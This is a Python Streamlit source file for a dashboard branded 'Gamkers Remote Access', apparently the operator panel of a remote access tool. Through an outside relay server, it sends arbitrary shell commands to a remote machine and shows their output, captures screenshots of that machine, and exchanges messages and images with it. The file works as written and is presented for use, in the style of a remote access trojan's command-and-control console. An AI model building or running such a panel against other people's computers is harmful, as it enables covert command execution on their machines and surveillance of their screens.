import streamlit as st
from st_on_hover_tabs import on_hover_tabs
import requests
from streamlit_lottie import st_lottie
import streamlit_shadcn_ui as ui
from streamlit_extras.stylable_container import stylable_container
import base64
from PIL import Image
import io
from datetime import datetime

# Set page configuration
st.set_page_config(page_title="Gamkers Remote Access", page_icon="🖥️", layout="wide")

# Custom CSS
st.markdown("""
<style>
body {
    background-color: #121212;
    color: #00FF00;
}
.stApp {
    background-color: #121212;
}
.stTextInput > div > div > input {
    color: #00FF00;
    background-color: #1E1E1E;
    border: 1px solid #00FF00;
    border-radius: 5px;
}
.stButton > button {
    color: #121212;
    background-color: #00FF00;
    border: none;
    border-radius: 5px;
}
.stMarkdown {
    color: #00FF00;
}
</style>
""", unsafe_allow_html=True)

# Importing external stylesheet
st.markdown('<style>' + open('./style.css').read() + '</style>', unsafe_allow_html=True)

# API Configuration
API_URL = "https://gamkertestbot.onrender.com"

def decode_image(base64_string):
    img_bytes = base64.b64decode(base64_string)
    return Image.open(io.BytesIO(img_bytes))

def load_lottie(url):
    try:
        response = requests.get(url)
        return response.json() if response.status_code == 200 else None
    except Exception:
        return None

def main():
    # On Hover Tabs Navigation
    with st.sidebar:
        tabs = on_hover_tabs(
            tabName=['Commands', 'Screenshot', 'Message Center'], 
            iconName=['terminal', 'camera', 'message-square'], 
            default_choice=0,
            styles={
                'navtab': {'background-color':'#1E1E1E', 
                           'color': '#00FF00', 
                           'font-size': '18px', 
                           'transition': '.3s',
                           'white-space': 'nowrap',
                           'text-transform': 'uppercase'},
                'tabOptionsStyle': {':hover :hover': {'color': '#00FF00', 'cursor': 'pointer'}},
            }
        )

    if tabs == 'Commands':
        commands_page()
    elif tabs == 'Screenshot':
        screenshot_page()
    elif tabs == 'Message Center':
        message_center_page()

def commands_page():
    st.title("🖥️ Remote Command Execution")
    
    # Lottie Animation
    lottie_url = "https://assets5.lottiefiles.com/packages/lf20_V9t630.json"
    lottie_json = load_lottie(lottie_url)
    if lottie_json:
        st_lottie(lottie_json, height=200, key="command_animation")
    
    # Command Input
    with stylable_container(
        key="command_input_container",
        css_styles="""
        {
            background-color: #1E1E1E;
            border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        command = st.text_input("Enter Command", placeholder="Type remote command here...")
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("Execute Command"):
                if command:
                    response = requests.post(f"{API_URL}/execute_command", json={"command": command})
                    if response.status_code == 200:
                        output = response.json().get('output', 'No output')
                        with st.container():
                            st.subheader("Command Output")
                            st.code(output, language='bash')
                    else:
                        st.error("Failed to execute command")

def screenshot_page():
    st.title("📸 Remote Screenshot")
    
    with stylable_container(
        key="screenshot_container",
        css_styles="""
        {
            background-color: #1E1E1E;
            border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        if st.button("Capture Screenshot"):
            response = requests.get(f"{API_URL}/take_screenshot")
            if response.status_code == 200:
                screenshot_data = response.json().get('screenshot')
                if screenshot_data:
                    # Decode base64 image
                    img_bytes = base64.b64decode(screenshot_data)
                    img = Image.open(io.BytesIO(img_bytes))
                    st.image(img, caption="Remote Screenshot", use_column_width=True)
                else:
                    st.error("No screenshot received")
            else:
                st.error("Failed to capture screenshot")

def message_center_page():
    st.title("💬 Message Center")
    
    # Message Input
    with stylable_container(
        key="message_container",
        css_styles="""
        {
            background-color: #1E1E1E;
            border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        # Message Sending Section
        message = st.text_input("Send Message", placeholder="Enter your message")
        
        if st.button("Send Message"):
            if message:
                try:
                    response = requests.post(
                        f"{API_URL}/send_message",
                        json={"message": message, "type": "text"}
                    )
                    if response.status_code == 200:
                        st.success("Message sent successfully!")
                    else:
                        st.error(f"Failed to send message. Status code: {response.status_code}")
                except Exception as e:
                    st.error(f"Error sending message: {str(e)}")

        # Message Retrieval Section
        st.subheader("Received Messages")
        if st.button("Refresh Messages"):
            try:
                response = requests.get(f"{API_URL}/get_messages")
                if response.status_code == 200:
                    messages = response.json()
                    if messages:
                        for msg in reversed(messages):
                            with st.container():
                                time_str = datetime.fromtimestamp(msg['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
                                
                                # Handle text messages
                                if msg['type'] == 'text':
                                    st.markdown(f"**Message at {time_str}**")
                                    st.code(msg['message'], language='text')
                                
                                # Handle image messages
                                elif msg['type'] == 'image':
                                    st.markdown(f"**Image received at {time_str}**")
                                    try:
                                        img = decode_image(msg['image'])
                                        st.image(img, caption=f"Image from {time_str}")
                                    except Exception as e:
                                        st.error(f"Error displaying image: {str(e)}")
                                
                                st.divider()
                    else:
                        st.info("No messages found.")
                else:
                    st.error(f"Failed to retrieve messages. Status code: {response.status_code}")
            except Exception as e:
                st.error(f"Error retrieving messages: {str(e)}")

if __name__ == "__main__":
    main()
